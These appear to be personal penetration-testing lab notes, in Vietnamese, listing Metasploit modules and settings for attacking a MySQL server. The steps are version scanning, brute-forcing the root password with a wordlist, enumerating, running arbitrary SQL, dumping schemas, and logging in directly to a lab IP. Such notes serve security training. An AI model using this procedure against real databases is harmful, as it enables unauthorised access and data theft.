# mySQL

port 3306

module `auxiliary/scanner/mysql/mysql_version`

module `auxiliary/scanner/mysql/mysql_login` - `set USERNAME root`, `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_password.txt`

sau khi có root và password 

module: `auxiliary/admin/mysql/mysql_enum` - để liệt kê trong mySQL - `set PASSWORD abc`, `set USERNAME abc`

module: `auxiliary/admin/mysql/mysql_sql` - để chạy câu lệnh SQL tùy ý - `set PASSWORD abc`, `set USERNAME abc`, `set SQL <>` để set các câu lệnh tuy vấn khi chạy module 

`set SQL show databases;`

module `auxiliary/scanner/mysql/mysql_schemadump` - `set PASSWORD abc`, `set USERNAME abc`

thoát khỏi MSF và kết nối trực tiếp mySQL

`mysql -h 192.143.6.3 -u root -p` -> enter password 






















